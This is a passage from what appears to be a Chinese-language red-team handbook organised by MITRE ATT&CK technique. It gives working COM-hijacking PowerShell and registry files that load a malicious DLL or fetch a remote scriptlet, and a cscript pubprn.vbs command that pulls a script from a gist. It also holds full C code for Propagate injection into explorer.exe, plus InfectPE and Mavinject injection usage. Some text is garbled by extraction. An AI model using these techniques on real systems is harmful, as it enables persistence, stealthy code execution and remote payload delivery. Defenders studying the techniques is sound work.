> SilentlyContinue \| Out-Null
>
> New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\" \|
> Out-Null
>
> New-Item -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\InProcServer32\" \| Out
>
> -Null
>
> New-Item -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\ShellFolder\" \| Out-Nul
> l
>
> New-ItemProperty -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\InProcServer 32\" -Name
> \"(default)\" -Value \$Payload \| Out-Null
>
> New-ItemProperty -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\InProcServer 32\" -Name
> \"ThreadingModel\" -Value \"Apartment\" \| Out-Null
>
> New-ItemProperty -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\InProcServer 32\" -Name
> \"LoadWithoutCOM\" -Value \"\" \| Out-Null
>
> New-ItemProperty -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\ShellFolder\"
>
> -Name \"HideOnDesktop\" -Value \"\" \| Out-Null
>
> New-ItemProperty -Path
> \"HKCU:\\Software\\Classes\\CLSID\\{\$CLSID}\\ShellFolder\"
>
> -Name \"Attributes\" -Value 0xf090013d -PropertyType DWORD \| Out-Null
>
> #forceiexploretoloadthemaliciousDLLandexecuteit
>
> \$shellWinGuid =
> \[System.Guid\]::Parse(\"{9BA05972-F6A8-11CF-A442-00A0C90A8F 39}\")
>
> \$typeShwin = \[System.Type\]::GetTypeFromCLSID(\$shellWinGuid)
>
> \$shwin = \[System.Activator\]::CreateInstance(\$typeShwin) \| ?
> {\$\_.fullname -match \'ie xplore\'} \| Select-Object -First 1
>
> \$shWin.Navigate2(\"shell:::{\$CLSID}\", 2048)
参考资料: https://ired.team/offensive-security/code-execution/forcing-
iexplore.exe-to-load-a-malicious-dll-via-com-abuse
内含视频:https://[www.ggsec.cn/comhijack2.html](http://www.ggsec.cn/comhijack2.html)
## ![](media/image231.jpeg){width="5.828409886264217in" height="3.9466666666666668in"}![](media/image232.jpeg){width="5.832976815398076in" height="3.416457786526684in"}COM 劫持(T1122)Component Object Model Hijacking(例 2)
> Windows Registry Editor Version 5.00
> \[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnc
>
> e\]
>
> \[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnc
> e\\setup\]
>
> @=\"rundll32 xwizards.dll,RunPropertySheet /u
> {00000001-0000-0000-0000-0000F EEDACDC}\"
>
> \"COM Hijacking\"=\"\"
>
> Windows Registry Editor Version 5.00
>
> \[HKEY_CURRENT_USER\\Software\\Classes\\Scripting.Dictionary\] @=\"\"
>
> \[HKEY_CURRENT_USER\\Software\\Classes\\Scripting.Dictionary\\CLSID\]
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
>
> \[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{00000001-0000-0000-0000-
> 0000FEEDACDC}\]
>
> @=\"Scripting.Dictionary\"
>
> \[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{00000001-0000-0000-0000-
>
> 0000FEEDACDC}\\InprocServer32\]
> @=\"C:\\\\WINDOWS\\\\system32\\\\scrobj.dll\"
> \"ThreadingModel\"=\"Apartment\"
>
> \[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{00000001-0000-0000-0000-
> 0000FEEDACDC}\\ProgID\]
>
> @=\"Scripting.Dictionary\"
> \[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{00000001-0000-0000-0000-
>
> 0000FEEDACDC}\\ScriptletURL\]
> @=\"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payl
> oad/Slmgr_calc.sct\"
>
> \[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{00000001-0000-0000-0000-
>
> 0000FEEDACDC}\\VersionIndependentProgID\] @=\"Scripting.Dictionary\"
>
> cscript
> C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\prncnfg.vbs /?
> cscript
> C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prncnfg.vbs /?
![](media/image233.jpeg){width="5.876847112860893in"
height="3.1231244531933506in"}
参考资料: https://twitter.com/harr0ey/status/1137443710197817344
## COM 劫持(T1122)Component Object Model Hijacking(例 3)
![](media/image234.png){width="5.833333333333333in"
height="5.524998906386702in"}ht
tps://[www.bleepingcomputer.com/news/security/windows-10-ransomware-](http://www.bleepingcomputer.com/news/security/windows-10-ransomware-)
protection-bypassed-using-dll-injection/
## COM 劫持(T1122)Component Object Model Hijacking(例 4)
![](media/image235.png){width="5.789143700787402in"
height="5.990937226596675in"}
> PS C:\\Users\\demon\> \$fileContent =
> \[System.IO.File\]::ReadAllBytes(\'C:\\Users\\demo
> n\\Desktop\\calcmutex.dll\')
>
> PS C:\\Users\\demon\> \$fileContentEncoded =
> \[System.Convert\]::ToBase64String(\$fil eContent)\| set-content
> (\"123.txt\")
https://github.com/3gstudent/test/blob/master/calcmutex.dll
![](media/image236.jpeg){width="5.823779527559055in"
height="2.349478346456693in"}
## 进程注入 Propagate( T1055 TA0005 TA0004 )
![](media/image237.jpeg){width="5.819340551181102in" height="3.8125in"}
https://github.com/odzhan/injection
https://modexp.wordpress.com/2018/08/23/process-injection-propagate/
它适用于Windows 7 和 10，但不执行错误检查，因此可能导致explorer.exe
崩溃或其他一些意外行为。
> VOID propagate(LPVOID payload, DWORD payloadSize) { HANDLE hp, p;
>
> DWORD id;
>
> HWND pwh, cwh; SUBCLASS_HEADER sh;
>
> LPVOID psh, pfnSubclass;
>
> SIZE_T rd,wr;
>
> //1.获取父窗口句柄
>
> pwh = FindWindow(L\"Progman\", NULL);
>
> //2.获取子窗口句柄
>
> cwh = FindWindowEx(pwh, NULL, L\"SHELLDLL_DefView\", NULL);
>
> //3.获取子类标题的句柄
>
> p = GetProp(cwh, L\"UxSubclassInfo\");
>
> //4.获取explorer.exe的进程ID
>
> GetWindowThreadProcessId(cwh, &id);
>
> //打开explorer.exe
>
> hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
>
> //6.读取当前子类标题
>
> ReadProcessMemory(hp, (LPVOID)p, &sh, sizeof(sh), &rd);
>
> //7.为新的子类标题分配RW内存
>
> psh = VirtualAllocEx(hp, NULL, sizeof(sh), MEM_RESERVE \| MEM_COMMIT,
> PAGE_READWRITE);
>
> //8.为有效负载分配RWX内存
>
> pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize, MEM_RESERVE \|
> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
>
> //9.将payload写入内存
>
> WriteProcessMemory(hp, pfnSubclass, payload, payloadSize, &wr);
>
> //10.将pfnSubclass字段设置为有效负载地址，并将
>
> //写回到处理内存
>
> sh.CallArray\[0\].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
> WriteProcessMemory(hp, psh, &sh, sizeof(sh), &wr);
>
> //11.使用SetProp
>
> SetProp(cwh, L\"UxSubclassInfo\", psh);
>
> //12.触发经由窗口消息payload
>
> PostMessage(cwh, WM_CLOSE, 0, 0);
>
> //13.恢复原始子类标题
>
> SetProp(cwh, L\"UxSubclassInfo\", p);
>
> //14.可用内存和关闭句柄
>
> VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT \| MEM_RELEASE);
> VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT \| MEM_RELEASE);
>
> CloseHandle(hp);
>
> }
## 进程注入 InfectPE( T1055 TA0005 TA0004 )
.\\InfectPE.exe .\\input.exe .\\out.exe code X
代码被注入代码段，这种方法更隐蔽，但有时代码段中没有足够的空间。
.\\InfectPE.exe .\\input.exe .\\out.exe largest X
代码被注入到零个数最多的部
分，使用这种方法可以注入更大的x
代码。该方法修改了该部分的特征，并且更加可疑。
.\\InfectPE.exe .\\input.exe .\\out.exe resize 展开代码段的大小并注入x
代码。这种技术，就像"代码"一样，不太可疑，也可以注入更大的x 代码。
.\\InfectPE.exe .\\input.exe .\\out.exe new
创建一个新的部分并向其中注入x 代码，该部分的硬编码名称是".infect"
在补丁文件中，ASLR 和NX 被禁用，您可以分析VS
项目的更多技术信息。请不要使用打包或格式不正确的可执行文件。
![](media/image238.jpeg){width="5.827212379702537in"
height="1.3885411198600175in"}
参 考 资 料 ：Github https://github.com/secrary/InfectPE
https://[www.microsoft.com/en-us/download/details.aspx?id=53840](http://www.microsoft.com/en-us/download/details.aspx?id=53840)
视频内容
：https://[www.ggsec.cn/InfectPE.html](http://www.ggsec.cn/InfectPE.html)
## 40. cscript ( TA0002 TA0005 T1216 )
> cscript
> C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs
> localhost
> "script:https://gist.githubusercontent.com/enigma0x3/2e4f571fe76715640d0f8126f
> 3
>
> 21ba07/raw/73c962d65059a211b5d7ea212e9a1054d632622b/new.txt"
![](media/image239.jpeg){width="5.87340113735783in"
height="3.084374453193351in"}
## 41.Mavinject(T1218)
DLL 注入 什么是DLL 注入？DLL 注入是将 DLL
注入进程的内存空间，然后将其作为其一部分执行的过程。这样做意味着DLL
代码具有对进程内存的所有访问权限，无论出于何种原因都可以对其进行操作，但更重要的是，它还获得了进程的所有权限。例如，您希望与外界沟通，但您没有通过防火墙的权限。随着注入
DLL，你可以注入并执行你的代码到其中的过程确实有权限（如Internet
Explorer），这将是能够做什么它需要。
![](media/image240.jpeg){width="5.445in"
height="3.1666666666666665in"}如果有人对如何编写一个基本的DLL
注入器感兴趣，请让我知道下面。用户模式Rootkit 用户模式rootkit
是提供与内核模式rootkit
类似功能的rootkit（尽管在技术上不是这样），例如屏蔽和禁止访问文件，但在用户级别操作。我们把这个级别称为ring
3，而内核模式rootkit 是ring 0。这些戒指是什么？这是一个视觉辅助图。
> ![](media/image241.png){width="5.806937882764655in"
> height="5.806937882764655in"}我
们可以看到，绿色是用户模式，中间的红色是内核模式。尽管环 1 和环 2 确实存
在，但实际上并不使用，所以我们只是指 0 或 3。从环 3 调用WinAPI
函数调用， 因为环 3 不能直接与CPU 通信，所以必须通过一系列特权检查向内环
0 进行响 铃。一旦进入响铃
0，操作系统执行指令来执行函数调用所需的操作。通过这样做，API 相信从环 3
传递到 0 并返回的参数将保持其完整性而不被修改。mavinjectMavinject
是一个合法的Windows
组件，可以在任何正在运行的进程中使用和滥用，执行任意代码注入。由于这是Windows
上的一个常见组件，因此可以利用它来执行无人区域的攻击。
![](media/image242.jpeg){width="5.833333333333333in"
height="5.641666666666667in"}进
一步分析后，我们被解雇的事件为假阳性，但我们仍然受到触发的原因，为什么一个合法的部分将执行这样的操作的原因感到困惑
EXCEL.EXE。
![](media/image243.jpeg){width="5.762194881889764in"
height="1.3499989063867017in"}
在时间轴方面，mavinject32.exe 在excel.exe 中执行代码注入
，然后立即终止。这引起了一些关于引擎操作可能带有恶意并且开始跟踪端点行为的担忧。以下是违规程序的细节：
> ![](media/image244.jpeg){width="5.833333333333333in"
> height="1.7166666666666666in"}现 在很清楚，mavinject32.exe
> 是一个合法的 Microsoft
> 组件。命令行也很有趣，因为从初步分析来看，论据似乎如下：
> mavinject32.exe \ \实际上是在端点上运行的excel.exe